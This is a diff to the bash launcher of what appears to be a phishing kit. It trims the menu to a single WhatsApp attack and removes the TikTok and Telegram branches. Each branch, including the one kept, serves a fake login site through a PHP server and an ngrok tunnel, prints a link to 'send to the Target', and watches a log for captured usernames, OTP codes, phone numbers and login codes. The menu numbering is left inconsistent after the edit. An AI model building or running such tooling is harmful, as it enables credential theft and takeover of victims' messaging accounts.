@@ -32,13 +32,11 @@ clear
 chmod 777 Logo.sh
 ./Logo.sh
 echo ""
-echo -e $'\e[1;32m\e[0m\e[1;32m SELECT ANY ATTACK  \e[0m'
+echo -e $'\e[1;32m\e[0m\e[1;32m WHATSAPP ATTACK  \e[0m'
 echo -e $'\e[1;37m\e[0m\e[1;37m --------------------- > > >\e[0m'
 echo ""
 banner(){
-printf "\e[1;32m[\e[0m\e[1;77m01\e[0m\e[1;32m]\e[0m\e[1;93m Tiktok \e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m WhatsApp-TFO \e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Telegram-TFO \e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m WhatsApp \e[0m\n"
 printf "\n"
 }
 banner
@@ -48,27 +46,8 @@ echo ""
                  read -p $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
 		 case $option in 
 			 
-                         1)cd sites/ 
-                           cd tiktok/
-                           echo ""
-                           echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
-                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-                           sleep 3
-                           echo ""
-                           echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
-                           ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 25
-                           echo ""
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-                           printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
-                           echo ""
-                           echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
-                           echo ""
-                           tail -f log.txt | grep -e "username" -e "otp"
 
-                ;;
-
-                  02)cd sites/
+                  01)cd sites/
                   cd whatsapp-phishing/
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
@@ -88,25 +67,7 @@ echo ""
 
                 ;;
 
-                  03)cd sites/
-                  cd telegram/
-                  echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
-                  php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-                  sleep 3
-                  echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
-                  ./ngrok http 4444 > /dev/null 2>&1 &
-                  sleep 25
-                  echo ""
-                  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
-                  echo ""
-                  echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
-                  echo ""
-                  tail -f log.txt | grep -e "phone_number" -e "phone_code"     
-
-                ;;
+                  
 
 
 
